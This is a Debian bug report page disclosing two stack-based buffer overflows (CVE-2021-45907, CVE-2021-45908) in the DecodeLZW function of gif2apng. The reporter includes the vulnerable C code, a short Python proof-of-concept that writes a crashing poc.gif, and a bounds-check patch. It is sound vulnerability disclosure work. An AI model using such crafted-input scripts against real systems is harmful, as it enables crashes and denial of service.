=== Content from bugs.debian.org_fb59fd06_20250108_113817.html ===

# Debian Bug report logs - #1002669 gif2apng: CVE-2021-45907 CVE-2021-45908: Two stack based buffer overflows in the DecodeLZW function

[![version graph](version.cgi?collapse=1;width=2;absolute=0;package=gif2apng;found=gif2apng%2F1.9%2Bsrconly-3;height=2;fixed=1.9%2Bsrconly-3%2Brm)](version.cgi?fixed=1.9%2Bsrconly-3%2Brm;info=1;absolute=0;collapse=1;package=gif2apng;found=gif2apng%2F1.9%2Bsrconly-3)

Package:
[gif2apng](pkgreport.cgi?package=gif2apng);
Maintainer for [gif2apng](pkgreport.cgi?package=gif2apng) is [Debian QA Group <packages@qa.debian.org>](pkgreport.cgi?maint=packages%40qa.debian.org); Source for [gif2apng](pkgreport.cgi?package=gif2apng) is [src:gif2apng](pkgreport.cgi?src=gif2apng) ([PTS](https://tracker.debian.org/pkg/gif2apng), [buildd](https://buildd.debian.org/gif2apng), [popcon](https://qa.debian.org/popcon.php?package=gif2apng)).

Reported by: [Kolja Grassmann <koljagrassmann@mailbox.org>](pkgreport.cgi?submitter=koljagrassmann%40mailbox.org)

Date: Sun, 26 Dec 2021 23:15:02 UTC

Severity: normal

Tags: security, upstream

Found in version gif2apng/1.9+srconly-3

Fixed in version 1.9+srconly-3+rm

**Done:** Debian FTP Masters <ftpmaster@ftp-master.debian.org>

Bug is archived. No further changes may be made.

Display info messages

View this report as an [mbox folder](bugreport.cgi?bug=1002669;mbox=yes), [status mbox](bugreport.cgi?bug=1002669;mbox=yes;mboxstatus=yes), [maintainer mbox](bugreport.cgi?bug=1002669;mbox=yes;mboxmaint=yes)

---

**Report forwarded**
to `debian-bugs-dist@lists.debian.org, Debian QA Group <packages@qa.debian.org>`:

`Bug#1002669`; Package `gif2apng`.
(Sun, 26 Dec 2021 23:15:04 GMT) ([full text](bugreport.cgi?bug=1002669;msg=2), [mbox](bugreport.cgi?bug=1002669;mbox=yes;msg=2), [link](#1)).

---

**Acknowledgement sent**
to `Kolja Grassmann <koljagrassmann@mailbox.org>`:

New Bug report received and forwarded. Copy sent to `Debian QA Group <packages@qa.debian.org>`.
(Sun, 26 Dec 2021 23:15:04 GMT) ([full text](bugreport.cgi?bug=1002669;msg=4), [mbox](bugreport.cgi?bug=1002669;mbox=yes;msg=4), [link](#3)).

---

[Message #5](#5) received at submit@bugs.debian.org ([full text](bugreport.cgi?bug=1002669;msg=5), [mbox](bugreport.cgi?bug=1002669;mbox=yes;msg=5), reply):

![](/cgi-bin/libravatar.cgi?email=koljagrassmann%40mailbox.org)
From: Kolja Grassmann <koljagrassmann@mailbox.org>
To: Debian Bug Tracking System <submit@bugs.debian.org>
Subject: gif2apng: Two stack based buffer overflows in the DecodeLZW
function
Date: Mon, 27 Dec 2021 00:12:12 +0100 (CET)
```
Package: gif2apng
Version: 1.9+srconly-3
Severity: normal
Tags: security

Dear Maintainer,

There are two stack based buffer overflows in the gif2apng application. The responsible code is located in the DecodeLZW function and looks as follows:

void DecodeLZW(unsigned char * img, unsigned int img_size, FILE * f1) // added
parameter img_size
{
  int i, bits, codesize, codemask, clearcode, nextcode, lastcode;
  unsigned int   j;
  unsigned int   size = 0;
  unsigned int   accum = 0;
  unsigned short prefix[4097];
  unsigned char  suffix[4097];
  unsigned char  str[4097];
  unsigned char  data[1024];
  unsigned char  firstchar = 0;
  unsigned char *pstr = str;
  unsigned char *pout = img;
  unsigned char  mincodesize;

  if (fread(&mincodesize, 1, 1, f1) != 1) return;

  bits = 0;
  codesize = mincodesize + 1;
  codemask = (1 << codesize) - 1;
  clearcode = 1 << mincodesize;
  nextcode = clearcode + 2;
  lastcode = -1;

  for (i=0; i<clearcode; i++)
    suffix[i] = i;
[...]
        while (code >= clearcode)
        {
          *pstr++ = suffix[code];
          code = prefix[code];
        }

In both loops at the end it is possible to write over the boundaries of the buffer by providing certain values a part of the gif file. For the for loop we can provide a large value for mincodesize leading to a clearcode bigger than 4097 and therefore overflowing the buffer. In the while loop we can provide code values, that repeat so that prefix[code] results in the same code again.

I wrote the following script to generate a poc.gif file:

#!/bin/python3

# Writing to poc.gif
f = open("poc.gif", "wb")
# Data needed to enter the code path:
beginning = b"GIF87a" + b"\x10\x00\x10\x00" + b"\x01" * 3 + b"\x2c" + b"\x01" *
9
f.write(beginning)

mincode = b"\x07"
# Uncomment the following line to trigger the other crash
# mincode = b"\x10"
f.write(mincode)

# Size value and byte we write to the heap
target_char = b"\x01" + b"\xff\xfe"*10000
f.write(target_char)

f.close()

The poc.gif file generated by the script does trigger the overflow in the while loop. If the other value for mincode is used it should trigger the overflow in the for loop. Using the poc.gif file as follows led to a segmentation fault:
$ gif2apng -i0 poc.gif /dev/null

gif2apng 1.9 using ZLIB

Reading 'poc.gif'...
Speicherzugriffsfehler

As I see no way to control the data, that is written in the loops I do not think, that this can necessarily exploited to gain code execution.

I fixed the issue locally by introducing a variable, that keeps track of the amount of data written to the pstr pointer and by doing some boundary checks before writing to the buffers:

if (clearcode > 4097) { // Added to avoid stack overflow here
    printf("Invalid Image\n");
    exit(0);
  }
  for (i=0; i<clearcode; i++)
    suffix[i] = i;
[...]
        if (code >= nextcode)
        {
          if ( write_counter <= 4097) { // Added to fix stack overflow here
            *pstr++ = firstchar;
            write_counter++;
            code = lastcode;
          }
          else {
            printf("Invalid Image\n");
            exit(0);
          }
        }

        while (code >= clearcode)
        {
          if ( write_counter <= 4097) { // Added to fix stack overflow here
            *pstr++ = suffix[code];
            write_counter++;
            code = prefix[code];
          }
          else {
            printf("Invalid Image\n");
            exit(0);
          }
        }
        if ( write_counter <= 4097) { // Added to fix stack overflow here
          *pstr++ = firstchar = suffix[code];
          write_counter++;
        }
        else {
          printf("Invalid Image\n");
          exit(0);
        }

This seemed to fix the issue for me locally, but it could use some more testing.

Best regards
Kolja

-- System Information:
Debian Release: 10.11
  APT prefers oldstable-updates
  APT policy: (500, 'oldstable-updates'), (500, 'oldstable')
Architecture: amd64 (x86_64)

Kernel: Linux 4.19.0-18-amd64 (SMP w/8 CPU cores)
Kernel taint flags: TAINT_OOT_MODULE, TAINT_UNSIGNED_MODULE
Locale: LANG=de_DE.UTF-8, LC_CTYPE=de_DE.UTF-8 (charmap=UTF-8), LANGUAGE=de_DE.UTF-8 (charmap=UTF-8)
Shell: /bin/sh linked to /usr/bin/dash
Init: systemd (via /run/systemd/system)
LSM: AppArmor: enabled

Versions of packages gif2apng depends on:
ii  libc6       2.28-10
ii  libzopfli1  1.0.2-1
ii  zlib1g      1:1.2.11.dfsg-1

gif2apng recommends no packages.

Versions of packages gif2apng suggests:
pn  apng2gif  <none>

-- no debconf information

```

---

**Added tag(s) upstream.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Sun, 26 Dec 2021 23:21:10 GMT) ([full text](bugreport.cgi?bug=1002669;msg=7), [mbox](bugreport.cgi?bug=1002669;mbox=yes;msg=7), [link](#6)).

---

**Changed Bug title to 'gif2apng: CVE-2021-45907 CVE-2021-45908: Two stack based buffer overflows in the DecodeLZW function' from 'gif2apng: Two stack based buffer overflows in the DecodeLZW function'.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Tue, 28 Dec 2021 08:27:05 GMT) ([full text](bugreport.cgi?bug=1002669;msg=9), [mbox](bugreport.cgi?bug=1002669;mbox=yes;msg=9), [link](#8)).

---

**Reply sent**
to `Debian FTP Masters <ftpmaster@ftp-master.debian.org>`:

You have taken responsibility.
(Mon, 07 Feb 2022 21:45:11 GMT) ([full text](bugreport.cgi?bug=1002669;msg=11), [mbox](bugreport.cgi?bug=1002669;mbox=yes;msg=11), [link](#10)).

---

**Notification sent**
to `Kolja Grassmann <koljagrassmann@mailbox.org>`:

Bug acknowledged by developer.
(Mon, 07 Feb 2022 21:45:11 GMT) ([full text](bugreport.cgi?bug=1002669;msg=13), [mbox](bugreport.cgi?bug=1002669;mbox=yes;msg=13), [link](#12)).

---

[Message #14](#14) received at 1002669-done@bugs.debian.org ([full text](bugreport.cgi?bug=1002669;msg=14), [mbox](bugreport.cgi?bug=1002669;mbox=yes;msg=14), reply):

![](/cgi-bin/libravatar.cgi?email=ftpmaster%40ftp-master.debian.org)
From: Debian FTP Masters <ftpmaster@ftp-master.debian.org>
To: 932931-done@bugs.debian.org,1002621-done@bugs.debian.org,1002667-done@bugs.debian.org,1002668-done@bugs.debian.org,1002669-done@bugs.debian.org,1002687-done@bugs.debian.org,920100-done@bugs.debian.org,
Cc: gif2apng@packages.debian.org
Subject: Bug#1004933: Removed package(s) from unstable
Date: Mon, 07 Feb 2022 21:43:10 +0000
```
Version: 1.9+srconly-3+rm

Dear submitter,

as the package gif2apng has just been removed from the Debian archive
unstable we hereby close the associated bug reports.  We are sorry
that we couldn't deal with your issue properly.

For details on the removal, please see <https://bugs.debian.org/1004933>

The version of this package that was in Debian prior to this removal
can still be found using <http://snapshot.debian.org/>.

Please note that the changes have been done on the master archive and
will not propagate to any mirrors until the next dinstall run at the
earliest.

This message was generated automatically; if you believe that there is
a problem with it please contact the archive administrators by mailing
ftpmaster@ftp-master.debian.org.

Debian distribution maintenance software
pp.
Scott Kitterman (the ftpmaster behind the curtain)

```

---

**Bug archived.**
Request was from `Debbugs Internal Request <owner@bugs.debian.org>`
to `internal_control@bugs.debian.org`.
(Tue, 08 Mar 2022 07:29:19 GMT) ([full text](bugreport.cgi?bug=1002669;msg=16), [mbox](bugreport.cgi?bug=1002669;mbox=yes;msg=16), [link](#15)).

---

Send a report that [this bug log contains spam](https://bugs.debian.org/cgi-bin/bugspam.cgi?bug=1002669).

---

Debian bug tracking system administrator <owner@bugs.debian.org>.
Last modified:
Wed Jan 8 11:38:17 2025;
Machine Name:
buxtehude

[Debian Bug tracking system](https://www.debian.org/Bugs/)

Debbugs is free software and licensed under the terms of the GNU General
Public License version 2. The current version can be obtained
from <https://bugs.debian.org/debbugs-source/>.

Copyright Â© 1999 Darren O. Benham,
1997,2003 nCipher Corporation Ltd,
1994-97 Ian Jackson,
2005-2017 Don Armstrong, and many other contributors.


